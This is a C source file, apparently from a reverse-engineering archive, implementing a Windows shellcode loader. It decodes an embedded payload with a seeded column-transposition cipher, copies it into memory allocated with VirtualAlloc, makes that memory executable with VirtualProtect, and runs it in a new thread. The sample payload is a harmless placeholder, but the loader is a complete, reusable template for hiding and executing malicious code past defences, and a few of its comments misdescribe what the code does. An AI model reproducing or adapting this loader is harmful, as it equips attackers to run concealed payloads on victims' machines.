/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    column-ordering
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [C] [S] [Shellcode]

    C is the key for column-ordering, which represent the length of matrix
    S is the seed for permutation (Fisher-Yates shuffle)
*/
struct header_t
{
    uint32_t column;
    uint32_t seed;
};

// Permutation with Fisher-Yates Shuffle algorithm.
void permutation (uint8_t index[], uint32_t size, uint32_t seed)
{
    uint8_t temp;

    // seed the random generator
    // alternative: use mersenne twister
    srand (seed);

    // start from the last element and swap one by one
    for (int i = size-1; i > 0; i--)
    {
        // pick random index from 0 to 1
        int j = rand() % (i + 1);

        // swap index[i] with the element at random index
        temp = index[i];
        index[i] = index[j];
        index[j] = temp;
    }
}

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer + header.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    uint8_t *   indexes;
    uint32_t    row;
    uint32_t    idx_r, idx_c, idx_s;
    header_t *  header;

    // extract header and recalculate size
    header  = (header_t*)src;
    size   -= sizeof(header_t);
    row     = size / header->column;

    // generate index for column reordering
    indexes = (uint8_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, header->column);
    for (idx_c = 0; idx_c < header->column; idx_c++) indexes[idx_c] = idx_c;
    permutation(indexes, header->column, header->seed);

    // reordering
    src += sizeof(header_t);
    for (idx_r = 0, idx_s = 0; idx_r < size; idx_r += header->column)
    {
        for (idx_c = 0; idx_c < header->column; idx_c++, idx_s++)
        {
            dst[idx_r + indexes[idx_c]] = src[idx_s];
        }
    }

    HeapFree (GetProcessHeap(), 0, indexes);
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x08, 0x00, 0x00, 0x00, 0x37, 0x13, 0x00, 0x00, 0x00, 0x00, 0xc3, 0xcc, 0x90, 0x00, 0x90, 0x00 };
    uint32_t    payload_len = 16;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer 
    // discard first byte which is key
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}